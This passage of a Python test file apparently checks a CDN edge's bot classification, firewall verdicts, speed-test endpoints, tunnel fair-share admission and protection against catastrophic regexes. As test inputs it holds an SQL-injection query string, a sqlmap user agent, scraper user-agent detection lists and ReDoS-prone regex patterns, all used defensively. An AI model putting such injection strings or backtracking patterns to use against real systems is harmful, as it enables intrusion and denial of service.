        (bb, "0g", False, None), (gb, "0b", False, None),             # no ranges for that engine: fail open
        (gb, "0g", False, "spoofed"),
        ("", "1gb", False, "empty_ua"), ("curl/8.5.0", "0gb", False, "library"), ("Wget/1.21", "", False, "library"),
        ("python-requests/2.31", "", False, "library"), ("Go-http-client/1.1", "", False, "library"),
        ("Scrapy/2.11 (+https://scrapy.org)", "", False, "library"), ("okhttp/4.12", "", False, "library"),
        ("Mozilla/5.0 HeadlessChrome/120.0", "", False, "headless"), ("Mozilla/5.0 PhantomJS/2.1", "", False, "headless"),
        (chrome, "0gb", False, None), ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile/15E148 Safari/604.1", "", False, None),
        ("Mozilla/5.0 (compatible; AdsBot-Google; +http://www.google.com/adsbot.html)", "0gb", False, None),
    ]
    res = run(tmp_path, [{"kind": "botclass", "ua": ua, "vbot": vb} for ua, vb, *_ in cases])
    assert res == [{"verified": v, "rule": rule} for *_, v, rule in cases], list(zip(cases, res))
    assert run(tmp_path, [{"kind": "botclass", "ua": "", "vbot": "", "blockEmpty": False}]) == [{"verified": False, "rule": None}]


def test_bot_modes_in_verdict(tmp_path):
    gb = "Mozilla/5.0 (compatible; Googlebot/2.1)"
    bots = lambda mode, **k: dict({"mode": mode, "allow_verified": True, "block_empty_ua": True}, **k)  # noqa: E731
    build(tmp_path, {"1": site(bots=bots("block")), "2": site(bots=bots("challenge")), "3": site(bots=bots("log")),
                     "4": site(bots=bots("log"), ddos={"mode": "js"}),
                     "5": site(bots=bots("log", allow_verified=False), ddos={"mode": "js"}),
                     "6": site(ddos={"mode": "js"}),
                     "8": site(bots=bots("log"), ratelimit=[
                         {"id": "c", "path_re": "^/c$", "methods": [], "requests": 1, "period": 60, "action": "challenge"},
                         {"id": "b", "path_re": "^/b$", "methods": [], "requests": 1, "period": 60, "action": "block"}]),
                     "7": site(bots=bots("block"), firewall={"default_action": "allow", "rules": [
                         {"id": "ok", "action": "allow", "conditions": [{"field": "path", "op": "starts_with", "value": "/api"}]}]})})

    def v(sid, ua, vb="0gb", uri="/"):
        return {"kind": "verdict", "site": sid, "uri": uri, "extra": {"headers": {"User-Agent": ua}, "vars": {"pcdn_vbot": vb}}}
    res = run(tmp_path, [v("1", "curl/8"), v("2", "curl/8"), v("3", "curl/8"), v("1", gb), v("1", gb, "1gb"),
                         v("4", gb, "1gb"), v("4", "Mozilla/5.0"), v("5", gb, "1gb"), v("6", gb, "1gb"),
                         v("7", "curl/8", uri="/api/x"), v("1", None),
                         v("8", gb, "1gb", "/c"), v("8", gb, "1gb", "/c"), v("8", gb, "1gb", "/b"), v("8", gb, "1gb", "/b"),
                         v("8", "Mozilla/5.0", "1gb", "/c"), v("8", "Mozilla/5.0", "1gb", "/c")])
    assert res == ["block:bots:library", "challenge:bots:library", "log:bots:library", "block:bots:spoofed", "ok",
                   "ok",                       # verified crawler: no DDoS challenge (allow_verified)
                   "challenge:ddos:js", "challenge:ddos:js", "challenge:ddos:js",
                   "ok",                       # firewall allow skips bot rules
                   "block:bots:empty_ua",
                   "ok", "ok",                 # verified crawler: no rate-limit challenge ...
                   "ok", "block:ratelimit:b",  # ... but rate-limit blocks (429) still apply
                   "ok", "challenge:ratelimit:c"]


# ----------------------------------------------------------------- transform response headers

def test_transform_header_filter(tmp_path):
    ops = [{"f": "", "op": "set", "n": "X-Base", "v": "b"}, {"f": "pcdn_tf_1_0", "op": "del", "n": "Set-Cookie"},
           {"f": "pcdn_tf_1_0", "op": "set", "n": "X-Base", "v": "c"}, {"f": "pcdn_tf_1_1", "op": "set", "n": "X-B", "v": "1"}]
    build(tmp_path, {"1": site(tf_resp=ops), "2": site()})
    out = {"Set-Cookie": ["a=1", "b=2"], "X-Base": "origin", "X-Other": "o"}
    res = run(tmp_path, [{"kind": "tfh", "site": "1", "uri": "/", "out": out,
                          "extra": {"vars": {"pcdn_tf_1_0": "1", "pcdn_tf_1_1": "0"}}},
                         {"kind": "tfh", "site": "1", "uri": "/", "out": out,
                          "extra": {"vars": {"pcdn_tf_1_0": "0", "pcdn_tf_1_1": "1"}}},
                         {"kind": "tfh", "site": "2", "uri": "/", "out": out}])
    assert res[0] == {"X-Base": "c", "X-Other": "o"}
    assert res[1] == {"Set-Cookie": ["a=1", "b=2"], "X-Base": "b", "X-Other": "o", "X-B": "1"}
    assert res[2] == out


# ----------------------------------------------------------------- wave 7 (SPEC §15.2 / §15.6)

def test_speed_paths_skip_challenges_but_not_blocks(tmp_path):
    fw = {"default_action": "allow", "rules": [
        {"id": "chal", "action": "challenge", "conditions": [{"field": "path", "op": "starts_with", "value": "/"}]},
        {"id": "evil", "action": "block", "conditions": [{"field": "header", "name": "X-Evil", "op": "eq", "value": "1"}]}]}
    build(tmp_path, {"1": site(firewall=fw, waf={"mode": "block", "groups": ALL_GROUPS, "exclusions": [], "off_paths": []},
                               ddos={"mode": "js", "threshold_rps": 1}),
                     "2": site(blocked_ips=["127.0.0.0/8"]),
                     "3": site(firewall={"default_action": "block", "rules": []})})
    res = run(tmp_path, [
        {"kind": "verdict", "site": "1", "uri": "/__pcdn/speed/ping", "args": "x=1'%20or%20'1'='1"},
        {"kind": "verdict", "site": "1", "uri": "/__pcdn/speed/down", "args": "bytes=100",
         "extra": {"headers": {"User-Agent": "sqlmap/1.7"}}},
        {"kind": "verdict", "site": "1", "uri": "/__pcdn/speed/up", "extra": {"headers": {"X-Evil": "1"}}},
        {"kind": "verdict", "site": "1", "uri": "/page"},
        {"kind": "verdict", "site": "1", "uri": "/__pcdn/verify"},       # other /__pcdn/ paths: untouched
        {"kind": "verdict", "site": "2", "uri": "/__pcdn/speed/ping"},
        {"kind": "verdict", "site": "3", "uri": "/__pcdn/speed/ping"},
    ])
    assert res == ["ok", "ok", "block:firewall:evil", "challenge:firewall:chal", "ok", "block:firewall:blocked_ips",
                   "block:firewall:default"]


def test_speed_down_validation(tmp_path):
    build(tmp_path, {"1": site()})
    size = 10 * 1024 * 1024 + 64
    res = run(tmp_path, [{"kind": "speed", "site": "1", "args": a} for a in (
        {"bytes": "1000000"}, {"bytes": "10485760"}, {"bytes": "64"}, {"bytes": "63"}, {"bytes": "1"}, {},
        {"bytes": "0"}, {"bytes": "10485761"}, {"bytes": "-5"}, {"bytes": "1e6"}, {"bytes": ["1", "2"]})])
    assert res[0] == {"redirect": f"/__pcdn/speed/file?start={size + 13 - 1000000}"}
    assert res[1] == {"redirect": f"/__pcdn/speed/file?start={size + 13 - 10485760}"}
    assert res[2] == {"redirect": f"/__pcdn/speed/file?start={size + 13 - 64}"}
    assert res[3] == {"code": 200, "len": 63} and res[4] == {"code": 200, "len": 1}
    assert res[5] == {"redirect": f"/__pcdn/speed/file?start={size + 13 - 1048576}"}   # default 1 MB
    assert res[6:] == [{"code": 400, "len": None}] * 5


def test_fair_share_admission(tmp_path):
    build(tmp_path, {"1": site(tunnel_paths=["/t"], tunnel_fair=True), "2": site(tunnel_paths=["/t"]),
                     "3": site(tunnel_paths=["/t"], tunnel_fair=False)})
    # not hot: nothing refused, everything counted
    res = run(tmp_path, [{"kind": "fair", "opens": [["1"]] * 50}])
    assert res[0] == [""] * 50
    hot = [{"kind": "fairset", "hot": "25"}]
    # hot, but nobody else opened anything: never refused (nobody to protect)
    res = run(tmp_path, hot + [{"kind": "fair", "opens": [["1"]] * 50}])
    assert res[0] == {"code": 204, "hot": 25} and res[1] == [""] * 50
    # hot, others opened 12: the hog is refused once it has >= 30 opens, holds > 25 % and more than all
    # the others together; refusals are not counted, so it converges to that line instead of locking out
    res = run(tmp_path, hot + [{"kind": "fair", "opens": [["2"]] * 12 + [["1"]] * 40 + [["2"]] * 18 + [["1"]] * 5}])
    v = res[1]
    assert v[:12] == [""] * 12 and v[12:42] == [""] * 30 and v[42:52] == ["1"] * 10
    assert v[52:70] == [""] * 18                        # the other site (30 opens, not dominant) is admitted
    assert v[70] == "" and v[71:] == ["1"] * 4          # 30 vs 30: one more, then 31 > 30 is refused again
    # two busy sites above 25 % each never starve each other: only a dominant (> 50 %) one is refused
    res = run(tmp_path, hot + [{"kind": "fair", "opens": [["1"], ["2"]] * 100}])
    assert res[1] == [""] * 200
    # xhttp: only the downlink GET is a session opening; packet POSTs are never refused nor counted
    res = run(tmp_path, hot + [{"kind": "fair", "opens": [["2"]] * 12 + [["1", "xhttp"]] * 40
                                + [["1", "xhttp", "POST"]] * 5 + [["3"]] * 40}])
    v = res[1]
    assert v[12:42] == [""] * 30 and "1" in v[42:52] and v[52:57] == [""] * 5
    assert v[57:] == [""] * 40                          # fair_share false: never refused
    # the hot flag is cleared with hot=0 / junk
    res = run(tmp_path, [{"kind": "fairset", "hot": "25"}, {"kind": "fairset", "hot": "0"},
                         {"kind": "fairset", "hot": "x"}, {"kind": "fairset", "hot": "101"}])
    assert [x["hot"] for x in res] == [25, None, None, None]


# ----------------------------------------------------------------- customer regexes (security review H2)

def _agent():
    import importlib.util
    spec = importlib.util.spec_from_file_location("agent_njs_h2", HERE.parent / "pcdn-agent.py")
    a = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(a)
    return a


# the worst patterns the edge still accepts (degree 2: one wide quantifier unanchored, or two anchored)
BORDERLINE = ["Mozilla.*Chrome", "^/(.*)/(.*)$", ".*\\.php$", "foo[^/]*/bar.*", "^(.*)a(.*)b$", "a.*b$",
              "x[a-z]*y[0-9]*", "^.*a.*$"]
ADVERSARIAL = [[p, u, 50000, s] for p in ("", "/") for u in ("a", "/", "ab", "a/", " ", "x", ".", "Mozilla", "foo")
               for s in ("", "!", "b!", "\n")]


def test_customer_firewall_regexes_are_bounded(tmp_path):
    """Every regex the edge accepts, on 50 kB adversarial values (V8: no PCRE match limit, no
    required-character shortcut - the slower engine): njs tests at most RE_INPUT_MAX characters."""
    a = _agent()
    for p in BORDERLINE:
        assert a.regex_unsafe(p, ascii_only=False) is None, p
    def rules(field, name=None):
        return [{"id": f"r{i}", "action": "block", "conditions": [dict({"field": field, "op": "regex", "value": p},
                                                                       **({"name": name} if name else {}))]}
                for i, p in enumerate(BORDERLINE)]
    build(tmp_path, {"1": site(firewall={"default_action": "allow", "rules": rules("user_agent")}),
                     "2": site(firewall={"default_action": "allow", "rules": rules("header", "X-Probe")}),
                     "3": site(firewall={"default_action": "allow", "rules": rules("path")})})
    res = run(tmp_path, [{"kind": "timed", "site": "1", "field": "User-Agent", "inputs": ADVERSARIAL},
                         {"kind": "timed", "site": "2", "field": "X-Probe", "inputs": ADVERSARIAL},
                         {"kind": "timed", "site": "3", "field": "path", "inputs": [["/"] + x[1:] for x in ADVERSARIAL]}])
    for r in res:
        assert r["worst"] < 100, res   # all 8 rules on one request
    # semantics kept below the cap
    assert run(tmp_path, [{"kind": "verdict", "site": "1", "uri": "/", "extra": {"headers": {"User-Agent": "Mozilla/5 Chrome/1"}}},
                          {"kind": "verdict", "site": "1", "uri": "/", "extra": {"headers": {"User-Agent": "curl/8"}}}]) \
        == ["block:firewall:r0", "ok"]


def test_unsafe_regexes_never_reach_njs_and_njs_backstop(tmp_path):
    a = _agent()
    unsafe = ["^(a+)+$", "(a|aa)*c", "(.*a){12}", "^(\\w+\\s?)*$", "a.*a.*b", "Mozilla.*Windows.*Chrome", "x" * 300]
    for p in unsafe:
        assert a.regex_unsafe(p, ascii_only=False), p
    fw = {"default_action": "allow", "rules": [
        {"id": f"u{i}", "action": "block", "conditions": [{"field": "user_agent", "op": "regex", "value": p}]}
        for i, p in enumerate(unsafe)] + [
        {"id": "good", "action": "block", "conditions": [{"field": "user_agent", "op": "regex", "value": "^evil"}]}]}
    js = a.site_js({"id": 1, "domain": "x.test", "firewall": fw}, [], {}, {})
    assert [r["id"] for r in js["firewall"]["rules"]] == ["good"]
    # a sites.js that still carries them (older agent): njs drops what its backstop sees
    # (length, back-references, a repeated single quantified atom) and caps the rest
    build(tmp_path, {"1": site(firewall=fw)})
    res = run(tmp_path, [
        {"kind": "verdict", "site": "1", "uri": "/", "extra": {"headers": {"User-Agent": "a" * 30}}},
        {"kind": "verdict", "site": "1", "uri": "/", "extra": {"headers": {"User-Agent": "evil/1"}}},
        {"kind": "timed", "site": "1", "field": "User-Agent", "inputs": [["", "a", 25, "!"], ["", "\t", 25, "!"]]}])
    # ^(a+)+$ is dropped by the backstop (it would match); (.*a){12} is beyond it and still runs
    assert res[0] == "block:firewall:u2" and res[1] == "block:firewall:good"
    assert res[2]["worst"] < 100


def test_multi_star_wildcards_are_linear_in_njs(tmp_path):
    a = _agent()
    pats = ["/*a*a*a*a*a*b", "/*/*/*/*/*x", "/api/*/v*/*.json"]
    rl = [{"id": f"r{i}", "path_re": a.wildcard_re(p, js=True), "methods": [], "requests": 1000000, "period": 60,
           "action": "block", "blockSeconds": 60} for i, p in enumerate(pats)]
    waf = {"mode": "block", "groups": [], "exclusions": [{"rule_id": 0, "path_re": a.wildcard_re("/*a*a*a*b", js=True)}],
           "off_paths": [a.wildcard_re("/*b*b*b*c", js=True)]}
    build(tmp_path, {"1": site(ratelimit=rl, waf=waf)})
    inputs = [["/", u, 50000, s] for u in ("a", "/", "ab", "b", "a/") for s in ("", "b!", "x!", "c!")]
    res = run(tmp_path, [{"kind": "timed", "site": "1", "field": "path", "inputs": inputs}])
    assert res[0]["worst"] < 100, res
